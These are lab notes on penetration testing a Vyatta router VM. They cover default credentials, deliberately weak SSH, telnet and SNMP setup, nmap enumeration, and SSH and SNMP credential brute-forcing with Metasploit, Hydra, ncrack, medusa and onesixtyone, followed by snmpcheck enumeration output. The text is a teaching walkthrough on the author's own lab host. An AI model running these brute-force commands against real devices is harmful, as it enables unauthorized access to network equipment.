Router Pentesting

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Software Vulnerabilities
1.) Rare and fixed soon
2.) Exploit Research

Faulty by design
1.) Difficult to find for mature products
2.) Reversing firmware images and testing

Configuration Flaws
1.) Very common
2.) As secure as the team implementing it

List of Configuration Flaws
1.) Attacking admin services
* SSH, Telnet
* HTTPD
* SNMP
2.) Routing Attacks
- RIP
- OSPF
- BGP

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Default Username and Password
vyatta
vyatta

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Installing vyatta
$ install image

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Set IP address for vyatta
$ configure
# set interfaces ethernet eth0 address 192.168.1.101/24
# commit
# save
# show interfaces

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Configure SSH
$ configure
# set service ssh
# commit
# save

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

vyatta@vyatta:~$ show configuration
interfaces {
    ethernet eth0 {
        address 192.168.1.101/24
        duplex auto
        hw-id 00:0c:29:77:a7:10
        smp_affinity auto
        speed auto
    }
    loopback lo {
    }
}
service {
    ssh {
    }
}
system {
    config-management {
        commit-revisions 20
    }
    console {
        device ttyS0 {
            speed 9600
        }
    }
    host-name vyatta
    login {
        user vyatta {
            authentication {
                encrypted-password ****************
            }
            level admin
        }
    }
    ntp {
        server 0.vyatta.pool.ntp.org {
        }
        server 1.vyatta.pool.ntp.org {
        }
        server 2.vyatta.pool.ntp.org {
        }
    }
    package {
        auto-sync 1
        repository community {
            components main
            distribution stable
            password ****************
            url http://packages.vyatta.com/vyatta
            username ""
        }
    }
    syslog {
        global {
            facility all {
                level notice
            }
            facility protocols {
                level debug
            }
        }
    }
    time-zone GMT
}
vyatta@vyatta:~$

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Setup SSH, Telnet, SNMP
$ configure
# set service ssh
# set service telnet
# set service https
# set service snmp
# set service snmp community public
# set service snmp community public authorization ro
# set service snmp community private authorization rw
# commit
# save

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Enumeration

In Kali
1.) TCP Scan
$ nmap -sV -n 192.168.1.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-02-28 12:38 EST
Nmap scan report for 192.168.1.101
Host is up (0.00083s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
23/tcp  open  telnet   Vyatta router telnetd 1.14.0 or later
80/tcp  open  http     lighttpd 1.4.28
443/tcp open  ssl/http lighttpd 1.4.28
MAC Address: 00:0C:29:77:A7:10 (VMware)
Service Info: OS: Linux; Device: router; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.88 seconds

2.) UDP Scan
$ nmap -sU -p 161 -sV -n 192.168.1.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-02-28 12:44 EST
Nmap scan report for 192.168.1.101
Host is up (0.00048s latency).
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
MAC Address: 00:0C:29:77:A7:10 (VMware)
Service Info: Host: vyatta

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.77 seconds

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

SSH
ssh vyatta@192.168.1.101
The authenticity of host '192.168.1.101 (192.168.1.101)' can't be established.
RSA key fingerprint is SHA256:GxLlb4qyM8g2fchXYk0IU1FAic0EUdOI0SRuREweuMw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.101' (RSA) to the list of known hosts.
Welcome to Vyatta
vyatta@192.168.1.101's password:
Linux vyatta 3.3.8-1-586-vyatta #1 SMP Wed Mar 13 10:35:45 PDT 2013 i686
Welcome to Vyatta.
This system is open-source software. The exact distribution terms for
each module comprising the full system are described in the individual
files in /usr/share/doc/*/copyright.
Last login: Tue Feb 28 09:39:40 2017
vyatta@vyatta:~$

Telnet
$ nc 192.168.1.101 23
��������
Welcome to Vyatta
vyatta login: vyatta
vyatta
Password: vyatta

Last login: Tue Feb 28 08:00:01 GMT 2017 from 192.168.1.10 on pts/0
Linux vyatta 3.3.8-1-586-vyatta #1 SMP Wed Mar 13 10:35:45 PDT 2013 i686
Welcome to Vyatta.
This system is open-source software. The exact distribution terms for
each module comprising the full system are described in the individual
files in /usr/share/doc/*/copyright.
vyatta@vyatta:~$ exit
exit
logout

HTTP
In Browser
192.168.1.101

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

SNMP
-sC -> runs nmap scripts
$ nmap -sU -p 161 -sV -sC -n 192.168.1.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-02-28 12:45 EST
Nmap scan report for 192.168.1.101
Host is up (0.00047s latency).
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 86d631386037b558
|   snmpEngineBoots: 1
|_  snmpEngineTime: 1h05m43s
| snmp-sysdescr: Vyatta VC6.6R1
|_  System uptime: 1h05m43.38s (394338 timeticks)
MAC Address: 00:0C:29:77:A7:10 (VMware)
Service Info: Host: vyatta

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds

Make SNMP Secure
$ configure
# delete service snmp community public
# set service snmp community public2 authorization ro
# commit
# save

Nmap Scan
$ nmap -sU -p 161 -sV -n -sC 192.168.1.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-02-28 12:50 EST
Nmap scan report for 192.168.1.101
Host is up (0.00045s latency).
PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 449a1b3ec947b558
|   snmpEngineBoots: 1
|_  snmpEngineTime: 37s
MAC Address: 00:0C:29:77:A7:10 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.76 seconds

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Cracking SSH credentials

In Vyatta
Create SSH user admin with password a2d2
$ configure
# set system login user admin authentication plaintext-password a2d2
# commit
# save

In Kali
Generate wordlist
$ crunch 4 4 ad12 > wordlist
Crunch will now generate the following amount of data: 1280 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 256

Cracking using MSF
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf auxiliary(ssh_login) > set BLANK_PASSWORDS false
BLANK_PASSWORDS => false
msf auxiliary(ssh_login) > set PASS_FILE /root/Desktop/wordlist
PASS_FILE => /root/Desktop/wordlist
msf auxiliary(ssh_login) > set RHOSTS 192.168.1.101
RHOSTS => 192.168.1.101
msf auxiliary(ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(ssh_login) > set USERNAME admin
USERNAME => admin
msf auxiliary(ssh_login) > set THREADS 20
THREADS => 20
msf auxiliary(ssh_login) > run

[*] SSH - Starting bruteforce
[-] SSH - Failed: 'admin:aaaa'
[!] No active DB -- Credential data will not be saved!
[-] SSH - Failed: 'admin:aaad'
[-] SSH - Failed: 'admin:aaa1'
[-] SSH - Failed: 'admin:aaa2'
[-] SSH - Failed: 'admin:aada'
[-] SSH - Failed: 'admin:aadd'
<snip>
[-] SSH - Failed: 'admin:a2a1'
[-] SSH - Failed: 'admin:a2a2'
[-] SSH - Failed: 'admin:a2da'
[-] SSH - Failed: 'admin:a2dd'
[-] SSH - Failed: 'admin:a2d1'
[+] SSH - Success: 'admin:a2d2' 'uid=1001(admin) gid=100(users) groups=100(users),4(adm),6(disk),27(sudo),30(dip),102(quaggavty),104(vyattacfg) Linux vyatta 3.3.8-1-586-vyatta #1 SMP Wed Mar 13 10:35:45 PDT 2013 i686 GNU/Linux '
[*] Command shell session 1 opened (192.168.1.13:46259 -> 192.168.1.101:22) at 2017-02-28 13:09:51 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) >

Crack using Hydra
hydra -l admin -P wordlist 192.168.1.101 ssh
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-02-28 13:09:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 64 tasks, 256 login tries (l:1/p:256), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.1.101   login: admin   password: a2d2
[STATUS] 256.00 tries/min, 256 tries in 00:01h, 1 to do in 00:01h, 16 active
[STATUS] 128.00 tries/min, 256 tries in 00:02h, 1 to do in 00:01h, 16 active

Crack using ncrack
$ ncrack -v -T 5 --user admin -P wordlist 192.168.1.101:22

Starting Ncrack 0.5 ( http://ncrack.org ) at 2017-02-28 13:13 EST

Discovered credentials on ssh://192.168.1.101:22 'admin' 'a2d2'
ssh://192.168.1.101:22 finished.

Discovered credentials for ssh on 192.168.1.101 22/tcp:
192.168.1.101 22/tcp ssh: 'admin' 'a2d2'

Ncrack done: 1 service scanned in 30.01 seconds.
Probes sent: 53 | timed-out: 0 | prematurely-closed: 15

Ncrack finished.

Crack using medusa
$ medusa -d
$ medusa -h 192.168.1.101 -u admin -P wordlist -M ssh
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaaa (1 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaad (2 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaa1 (3 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaa2 (4 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aada (5 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aadd (6 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aad1 (7 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aad2 (8 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aa1a (9 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aa1d (10 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aa11 (11 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aa12 (12 of 256 complete)
<snip>
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a122 (48 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2aa (49 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2ad (50 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2a1 (51 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2a2 (52 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2da (53 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2dd (54 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2d1 (55 of 256 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: a2d2 (56 of 256 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.1.101 User: admin Password: a2d2 [SUCCESS]

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Attacking SNMP

Setup Vyatta
$ configure
# set service snmp community a1d2 authorization ro
# delete service snmp community public2
# delete service snmp community private
# commit
# save

Using nmap
$ nmap -sU -p 161 --script snmp-brute 192.168.1.101 --script-args=snmp-brute.communitiesdb=wordlist

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-02-28 13:40 EST
Nmap scan report for 192.168.1.101
Host is up (0.00047s latency).
PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute:
|_  a1d2 - Valid credentials
MAC Address: 00:0C:29:77:A7:10 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 14.07 seconds

Using MSF
msf > use auxiliary/scanner/snmp/snmp_login
msf auxiliary(snmp_login) > show options

Module options (auxiliary/scanner/snmp/snmp_login):

   Name              Current Setting                                                       Required  Description
   ----              ---------------                                                       --------  -----------
   BLANK_PASSWORDS   false                                                                 no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                     yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                 no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                 no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                 no        Add all users in the current database to the list
   PASSWORD                                                                                no        The password to test
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt  no        File containing communities, one per line
   RHOSTS                                                                                  yes       The target address range or CIDR identifier
   RPORT             161                                                                   yes       The target port
   STOP_ON_SUCCESS   false                                                                 yes       Stop guessing when a credential works for a host
   THREADS           1                                                                     yes       The number of concurrent threads
   USER_AS_PASS      false                                                                 no        Try the username as the password for all users
   VERBOSE           true                                                                  yes       Whether to print output for all attempts
   VERSION           1                                                                     yes       The SNMP version to scan (Accepted: 1, 2c, all)

msf auxiliary(snmp_login) > set BLANK_PASSWORDS false
BLANK_PASSWORDS => false
msf auxiliary(snmp_login) > set PASS_FILE /root/Desktop/wordlist
PASS_FILE => /root/Desktop/wordlist
msf auxiliary(snmp_login) > set RHOSTS 192.168.1.101
RHOSTS => 192.168.1.101
msf auxiliary(snmp_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(snmp_login) > set THREADS 20
THREADS => 20
msf auxiliary(snmp_login) > run

[!] No active DB -- Credential data will not be saved!
[+] 192.168.1.101:161 - LOGIN SUCCESSFUL: a1d2 (Access level: read-only); Proof (sysDescr.0): Vyatta VC6.6R1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(snmp_login) >

Using medusa
Username doesn't have any significance in the SNMP brute force
$ medusa -M snmp -h 192.168.1.101 -u admin -P wordlist
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaaa (1 of 256 complete)
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaad (2 of 256 complete)
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaa1 (3 of 256 complete)
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aaa2 (4 of 256 complete)
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aada (5 of 256 complete)
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: aadd (6 of 256 complete)
<snip>
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: 2211 (251 of 256 complete)
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: 2212 (252 of 256 complete)
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: 222a (253 of 256 complete)
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: 222d (254 of 256 complete)
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: 2221 (255 of 256 complete)
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: 2222 (256 of 256 complete)
ACCOUNT CHECK: [snmp] Host: 192.168.1.101 (1 of 1, 0 complete) User: (null) (0 of 1, 1 complete) Password: a1d2 (1 of 0 complete)
ACCOUNT FOUND: [snmp] Host: 192.168.1.101 User: (null) Password: a1d2 [SUCCESS]

In Vyatta
$ show configuration
service {
    https {
    }
    snmp {
        community a1d2 {
            authorization ro
        }
    }
    ssh {
    }
    telnet {
    }
}

Using onesixtyone
$ crunch 4 4 ad12 > snmp_communtity_strings
Crunch will now generate the following amount of data: 1280 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 256
$ onesixtyone -c snmp_communtity_strings 192.168.1.101
Scanning 1 hosts, 256 communities
192.168.1.101 [a1d2] Vyatta VC6.6R1
$

Post exploitation using snmpcheck
http://www.nothink.org/codes/snmpcheck/
$ ./snmpcheck-1.9.rb -c a1d2 192.168.1.101
snmpcheck.rb v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.1.101:161 using SNMPv1 and community 'a1d2'

[*] System information:

  Host IP address               : 192.168.1.101
  Hostname                      : vyatta
  Description                   : Vyatta VC6.6R1
  Contact                       : root
  Location                      : Unknown
  Uptime snmp                   : 03:49:00.36
  Uptime system                 : 00:47:48.81
  System date                   : 2017-2-28 11:25:28.0

[*] Network information:

  IP forwarding enabled         : yes
  Default TTL                   : 64
  TCP segments received         : 9800
  TCP segments sent             : 9391
  TCP segments retrans          : 0
  Input datagrams               : 14920
  Delivered datagrams           : 14872
  Output datagrams              : 8646

[*] Network interfaces:

  Interface                     : [ up ] lo
  Id                            : 1
  Mac Address                   : :::::
  Type                          : softwareLoopback
  Speed                         : 10 Mbps
  MTU                           : 16436
  In octets                     : 363743
  Out octets                    : 363743

  Interface                     : [ up ] Advanced Micro Devices [AMD] 79c970 [PCnet32 LANCE]
  Id                            : 2
  Mac Address                   : 00:0c:29:77:a7:10
  Type                          : ethernet-csmacd
  Speed                         : 0 Mbps
  MTU                           : 1500
  In octets                     : 1822678
  Out octets                    : 749064


[*] Network IP:

  Id                    IP Address            Netmask               Broadcast
  1                     127.0.0.1             255.0.0.0             0
  2                     192.168.1.101         255.255.255.0         1

[*] Routing information:

  Destination           Next hop              Mask                  Metric
  127.0.0.0             0.0.0.0               255.0.0.0             0
  192.168.1.0           0.0.0.0               255.255.255.0         0

[*] TCP connections and listening ports:

  Local address         Local port            Remote address        Remote port           State
  0.0.0.0               22                    0.0.0.0               0                     listen
  0.0.0.0               80                    0.0.0.0               0                     listen
  0.0.0.0               443                   0.0.0.0               0                     listen
  127.0.0.1             199                   0.0.0.0               0                     listen
  127.0.0.1             199                   127.0.0.1             43501                 established
  127.0.0.1             199                   127.0.0.1             43502                 established
  127.0.0.1             199                   127.0.0.1             43503                 established
  127.0.0.1             43501                 127.0.0.1             199                   established
  127.0.0.1             43502                 127.0.0.1             199                   established
  127.0.0.1             43503                 127.0.0.1             199                   established
  192.168.1.101         22                    192.168.1.10          50631                 established

[*] Listening UDP ports:

  Local address         Local port
  0.0.0.0               123
  0.0.0.0               161
  127.0.0.1             123
  192.168.1.101         123

[*] Processes:

  Id                    Status                Name                  Path                  Parameters
  1                     runnable              init                  init [2]
  1615                  runnable              udevd                 udevd                 --daemon
  1775                  runnable              udevd                 udevd                 --daemon
  1776                  runnable              udevd                 udevd                 --daemon
  2292                  runnable              atd                   /usr/sbin/atd
  2300                  runnable              acpid                 /usr/sbin/acpid
  2336                  runnable              netplugd              /sbin/netplugd        -P -p /var/run/netplugd.pid
  2343                  runnable              cron                  /usr/sbin/cron
  2388                  runnable              zebra                 /usr/sbin/zebra       -d -P 0 -i /var/run/quagga/zebra.pid -S -s 1048576
  2398                  runnable              ripd                  /usr/sbin/ripd        -d -P 0 -i /var/run/quagga/ripd.pid
  2401                  runnable              ripngd                /usr/sbin/ripngd      -d -P 0 -i /var/run/quagga/ripngd.pid
  2407                  runnable              ospfd                 /usr/sbin/ospfd       -d -P 0 -i /var/run/quagga/ospfd.pid
  2422                  runnable              ospf6d                /usr/sbin/ospf6d      -d -P 0 -i /var/run/quagga/ospf6d.pid
  2434                  runnable              bgpd                  /usr/sbin/bgpd        -d -P 0 -i /var/run/quagga/bgpd.pid -I
  2628                  runnable              rsyslogd              /usr/sbin/rsyslogd    -c4
  2710                  runnable              ntpd                  /usr/sbin/ntpd        -p /var/run/ntpd.pid -g -u 102:107
  2713                  runnable              ntpd                  /usr/sbin/ntpd        -p /var/run/ntpd.pid -g -u 102:107
  2774                  runnable              getty                 /sbin/getty           38400 tty2
  2775                  runnable              getty                 /sbin/getty           38400 tty3
  2776                  runnable              getty                 /sbin/getty           38400 tty4
  2777                  runnable              getty                 /sbin/getty           38400 tty5
  2778                  runnable              getty                 /sbin/getty           38400 tty6
  2779                  runnable              getty                 /sbin/getty           -L ttyS0 9600 vt100
  2892                  runnable              login                 /bin/login            --
  2893                  runnable              vbash                 -vbash
  3069                  runnable              newgrp                newgrp                vyattacfg
  3071                  runnable              vbash                 vbash
  3183                  runnable              sshd                  /usr/sbin/sshd        -p 22
  3427                  runnable              sshd                  sshd: vyatta [priv]
  3430                  runnable              sshd                  sshd: vyatta@pts/0
  3431                  runnable              vbash                 -vbash
  3768                  runnable              busybox               /bin/busybox          telnetd -p 23
  3815                  runnable              lighttpd              /usr/sbin/lighttpd    -f /etc/lighttpd/lighttpd.conf
  3823                  runnable              chunker               /usr/sbin/chunker     -p /var/run/chunker.pid
  3825                  runnable              chunker               /usr/sbin/chunker     -p /var/run/chunker.pid
  5107                  running               snmpd                 /usr/sbin/snmpd       -LSid -Lf /dev/null -u snmp -g snmp -p /var/run/snmpd.pid
  5351                  runnable              less                  less                  --buffers=64 --auto-buffers --no-lessopen --QUIT-AT-EOF --quit-if-one-screen --RAW-CONTROL-CHARS --squeeze-blank-lines --no-init

[*] Storage information:

  Description                   : ["Physical memory"]
  Device id                     : [#<SNMP::Integer:0x9117700 @value=1>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x9116710 @value=1024>]
  Memory size                   : 247.20 MB
  Memory used                   : 149.84 MB

  Description                   : ["Virtual memory"]
  Device id                     : [#<SNMP::Integer:0x910620c @value=3>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x9104ad8 @value=1024>]
  Memory size                   : 247.20 MB
  Memory used                   : 149.84 MB

  Description                   : ["Memory buffers"]
  Device id                     : [#<SNMP::Integer:0x90f9354 @value=6>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x90f8030 @value=1024>]
  Memory size                   : 247.20 MB
  Memory used                   : 23.34 MB

  Description                   : ["Cached memory"]
  Device id                     : [#<SNMP::Integer:0x90e32ac @value=7>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x90e1e84 @value=1024>]
  Memory size                   : 80.62 MB
  Memory used                   : 80.62 MB

  Description                   : ["Shared memory"]
  Device id                     : [#<SNMP::Integer:0x90d6598 @value=8>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x90d4b30 @value=1024>]
  Memory size                   : 440.00 KB
  Memory used                   : 440.00 KB

  Description                   : ["Swap space"]
  Device id                     : [#<SNMP::Integer:0x90cc5e8 @value=10>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x90b2a58 @value=1024>]
  Memory size                   : 0 bytes
  Memory used                   : 0 bytes

  Description                   : ["/lib/init/rw"]
  Device id                     : [#<SNMP::Integer:0x90af038 @value=32>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x90adcb0 @value=4096>]
  Memory size                   : 123.60 MB
  Memory used                   : 0 bytes

  Description                   : ["/dev"]
  Device id                     : [#<SNMP::Integer:0x90a62bc @value=35>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x90a4f70 @value=4096>]
  Memory size                   : 116.40 MB
  Memory used                   : 180.00 KB

  Description                   : ["/dev/shm"]
  Device id                     : [#<SNMP::Integer:0x90a1a00 @value=36>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x909fafc @value=4096>]
  Memory size                   : 123.60 MB
  Memory used                   : 4.00 KB

  Description                   : ["/live/image"]
  Device id                     : [#<SNMP::Integer:0x9087c90 @value=38>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x9086908 @value=4096>]
  Memory size                   : 7.97 GB
  Memory used                   : 466.80 MB

  Description                   : ["/live/cow"]
  Device id                     : [#<SNMP::Integer:0x907ef3c @value=39>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x907e064 @value=4096>]
  Memory size                   : 7.97 GB
  Memory used                   : 466.80 MB

  Description                   : ["/live"]
  Device id                     : [#<SNMP::Integer:0x9077494 @value=40>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x9076594 @value=4096>]
  Memory size                   : 123.60 MB
  Memory used                   : 0 bytes

  Description                   : ["/tmp"]
  Device id                     : [#<SNMP::Integer:0x906f898 @value=41>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x906e7b8 @value=4096>]
  Memory size                   : 123.60 MB
  Memory used                   : 4.00 KB

  Description                   : ["/opt/vyatta/etc/config"]
  Device id                     : [#<SNMP::Integer:0x905fa38 @value=42>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x905e8cc @value=4096>]
  Memory size                   : 7.97 GB
  Memory used                   : 466.80 MB

  Description                   : ["/var/run"]
  Device id                     : [#<SNMP::Integer:0x905383c @value=43>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x905202c @value=4096>]
  Memory size                   : 123.60 MB
  Memory used                   : 76.00 KB

  Description                   : ["/opt/vyatta/config"]
  Device id                     : [#<SNMP::Integer:0x9042af0 @value=44>]
  Filesystem type               : ["unknown"]
  Device unit                   : [#<SNMP::Integer:0x9041b00 @value=4096>]
  Memory size                   : 123.60 MB
  Memory used                   : 172.00 KB


[*] Device information:

  Id                    Type                  Status                Descr
